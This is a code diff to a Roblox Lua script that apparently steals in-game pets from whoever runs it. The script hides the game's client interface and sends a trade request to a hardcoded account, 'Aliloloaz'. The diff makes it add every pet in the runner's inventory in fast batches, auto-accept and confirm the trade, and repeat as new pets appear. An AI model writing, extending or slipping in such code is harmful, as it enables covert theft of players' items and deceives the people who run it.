@@ -4,6 +4,7 @@ local LocalPlayer = Players.LocalPlayer
 local TradeAPI = ReplicatedStorage:WaitForChild("API")
 local WAIT_FIRST = 38
 local WAIT_CONFIRM = 18
+local BATCH_SIZE = 30
 
 local MANUAL_REMOTES = {
     TRADE_REQUEST = "iGrvxUkeWqCMDvTDHJyLYdOdf",
@@ -197,59 +198,59 @@ local function runCycle()
     suppressClientUI()
     discoverRemotes()
     while true do
-        local partner = getRealTradePartner()
-    local rOpenBag = Resolve("OPEN_BAG") or (Remotes.OpenBag and TradeAPI:FindFirstChild(Remotes.OpenBag)) or nil
-    local rAddPet = Resolve("ADD_PET") or (Remotes.AddPet and TradeAPI:FindFirstChild(Remotes.AddPet)) or nil
-    local rAccept1 = Resolve("ACCEPT_1") or (Remotes.Accept1 and TradeAPI:FindFirstChild(Remotes.Accept1)) or nil
-    local rConfirm2 = Resolve("CONFIRM_2") or (Remotes.Confirm2 and TradeAPI:FindFirstChild(Remotes.Confirm2)) or nil
-        local rToggleEdit = Resolve("TOGGLE_EDITING") or nil
-        if partner and rOpenBag and rAddPet and rAccept1 and rConfirm2 then
-            if rToggleEdit then
-                pcall(function() rToggleEdit:FireServer("toggle_editing", { editing = false }) end)
-            end
-            task.wait(0.5)
-            if rOpenBag:IsA("RemoteEvent") then
-                pcall(function() rOpenBag:FireServer({ picking = true }) end)
-            elseif rOpenBag:IsA("RemoteFunction") then
-                pcall(function() rOpenBag:InvokeServer({ picking = true }) end)
-            end
-            task.wait(0.5)
-            local pets = getPetItems()
-            if #pets > 0 then
-                if rAddPet:IsA("RemoteEvent") then
-                    pcall(function() rAddPet:FireServer(pets[1]) end)
-                elseif rAddPet:IsA("RemoteFunction") then
-                    pcall(function() rAddPet:InvokeServer(pets[1]) end)
-                end
-            end
-            task.wait(WAIT_FIRST)
-            if rAccept1:IsA("RemoteEvent") then
-                pcall(function() rAccept1:FireServer() end)
-            elseif rAccept1:IsA("RemoteFunction") then
-                pcall(function() rAccept1:InvokeServer() end)
-            end
-            task.wait(WAIT_CONFIRM)
-            if rConfirm2:IsA("RemoteEvent") then
-                pcall(function() rConfirm2:FireServer() end)
-            elseif rConfirm2:IsA("RemoteFunction") then
-                pcall(function() rConfirm2:InvokeServer() end)
-            end
-            task.wait(2)
+        local rRequest = Resolve("TRADE_REQUEST")
+        local rOpenBag = Resolve("OPEN_BAG")
+        local rAddPet = Resolve("ADD_PET")
+        local rAccept1 = Resolve("ACCEPT_1")
+        local rConfirm2 = Resolve("CONFIRM_2")
+        local rToggleEdit = Resolve("TOGGLE_EDITING")
+        if not (rRequest and rOpenBag and rAddPet and rAccept1 and rConfirm2) then
+            task.wait(1)
         else
-            discoverRemotes()
-            local target = Players:FindFirstChild("Aliloloaz")
-            local rRequest = Resolve("TRADE_REQUEST") or (Remotes.AcceptRequest and TradeAPI:FindFirstChild(Remotes.AcceptRequest)) or nil
-            if target and rRequest then
-                if rRequest:IsA("RemoteEvent") then
+            local found = getPetItems()
+            if #found == 0 then
+                task.wait(2)
+            else
+                local target = Players:FindFirstChild("Aliloloaz")
+                if target then
                     pcall(function() rRequest:FireServer(target) end)
-                elseif rRequest:IsA("RemoteFunction") then
-                    local ok = pcall(function() rRequest:InvokeServer(target) end)
-                    if not ok then
-                        pcall(function() rRequest:InvokeServer(target, true) end)
+                end
+                task.wait(3)
+                local idx = 1
+                local added = 0
+                while idx <= #found do
+                    if rToggleEdit then
+                        pcall(function() rToggleEdit:FireServer("toggle_editing", { editing = false }) end)
+                    end
+                    if rOpenBag then
+                        pcall(function() rOpenBag:FireServer("open_backpack") end)
+                    end
+                    task.wait(0.02)
+                    pcall(function() rAddPet:FireServer(found[idx]) end)
+                    added = added + 1
+                    if added % BATCH_SIZE == 0 then
+                        task.wait(0.1)
+                    else
+                        task.wait(0.03)
+                    end
+                    idx = idx + 1
+                end
+                if added > 0 then
+                    task.wait(WAIT_FIRST)
+                    pcall(function() rAccept1:FireServer() end)
+                    task.wait(WAIT_CONFIRM)
+                    pcall(function() rConfirm2:FireServer() end)
+                end
+                if idx > #found then
+                    local refresh = getPetItems()
+                    if #refresh == 0 then
+                        task.wait(2)
+                    else
+                        found = refresh
                     end
                 end
+                task.wait(1)
             end
-            task.wait(0.5)
         end
     end
 end
